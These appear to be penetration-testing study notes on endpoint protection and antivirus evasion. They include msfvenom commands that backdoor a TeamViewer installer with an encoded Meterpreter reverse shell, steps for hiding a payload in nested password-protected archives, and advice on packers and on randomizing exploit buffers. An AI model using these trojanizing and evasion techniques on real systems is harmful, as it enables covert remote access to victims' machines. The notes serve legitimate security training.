# Endpoint Protection
---
- `Endpoint protection` refers to **any localized device or service whose sole purpose is to protect a single host on the network.** 
- The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (`DMZ`).
- Endpoint protection usually **comes in the form of software packs** which include `Antivirus Protection`, `Antimalware Protection` (this includes bloatware, spyware, adware, scareware, ransomware), `Firewall`, and `Anti-DDOS` all in one, under the same software package.

# Perimeter Protection
---
- `Perimeter protection` usually comes in **physical or virtualized devices on the network perimeter edge.** 
- These `edge devices` themselves provide access `inside` of the network from the `outside`, in other terms, from `public` to `private`
- Between these two zones, on some occasions, we will also find a third one, **called the De-Militarized Zone (`DMZ`), which was mentioned previously**. 
- This is a ==`lower-security policy level` zone than the `inside networks'` one, but with a higher `trust level` than the `outside zone`, which is the vast Internet.==

# Security Policies
---
- Security policies are the drive behind every well-maintained security posture of any network. They function the same way as ACL (Access Control Lists) do for anyone familiar with the Cisco CCNA educational material.
- They are essentially **a list of `allow` and `deny` statements that dictate how traffic or files can exist within a network boundary**
- These lists can also target different features of the network and hosts, depending on where they reside:
	- Network Traffic Policies
	- Application Policies
	- User Access Control Policies
	- File Management Policies
	- DDoS Protection Policies
	- Others
- ![[Pasted image 20250628071845.png]]

# Evasion Techniques
---
- Most host-based anti-virus software nowadays relies **mainly on `Signature-based Detection` to identify aspects of malicious code** present in a software sample.
- These signatures are placed inside the Antivirus Engine, where **they are subsequently used to scan storage space and running processes** for any matches.
- The examples shown in the `Encoders` section show that simply encoding payloads using different encoding schemes with multiple iterations is not enough for all AV products.

- We are in luck because `msfvenom` **offers the option of using executable templates.** 
- This allows us to use **some pre-set templates for executable files, inject our payload into them, and use `any` executable as a platform from which we can launch our attack.**
- We can **embed the shellcode into any installer, package, or program that we have at hand,** hiding the payload shellcode **==deep within the legitimate code of the actual product==**

## To Something instead of nothing
---
- For the most part, when a target launches a backdoored executable, **nothing will appear to happen, which can raise suspicions in some cases.**
- To improve our chances, we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application.
- We do so with the `-k` flag:
	- `msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5`
		- `-i` => **Number of times to encode**
		  
- However, even with the `-k` flag running, t**he target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment.**
- A **separate window will pop up with the payload,** which will **not close until we finish running the payload session interaction on the target.**

## Archives
---
- Archiving a piece of information such as a file, folder, script, executable, picture, or document and **placing a password on the archive bypasses a lot of common anti-virus signatures today.**
- However, the downside of this process is that they will be raised as **notifications in the AV alarm dashboard** as being unable to be scanned due to being **locked with a password.**

	- `msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5`

- Archiving twice:
	- `rar a ~/test.rar -p ~/test.js`
		- ![[Pasted image 20250628072648.png]]
	- Removing the .RAR Extension:
		- `mv test.rar test`
	- Archiving the Payload Again
		- `rar a test2.rar -p test`
	- Removing the .RAR Extension:
		- `mv test2.rar test2`
		- ![[Pasted image 20250628072803.png]]

# Packers
---
- The term `Packer` refers to the result of an `executable compression` process **where the payload is packed together with an executable program and with the decompression code in one single file.**
- When run, the **decompression code returns the backdoored executable to its original state**, allowing for yet another layer of protection against file scanning mechanisms on target hosts.
- In addition, **msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.**

![[Pasted image 20250628072932.png]]

# Exploit Coding
---
- When coding our exploit or porting a pre-existing one over to the Framework, it is **good to ensure that the exploit code is not easily identifiable by security measures** implemented on the target system.
- For example, a typical `Buffer Overflow` exploit might be easily distinguished from regular traffic traveling over the network due to its hexadecimal buffer patterns.
- When assembling our exploit code, **==randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures==** for well-known exploit buffers.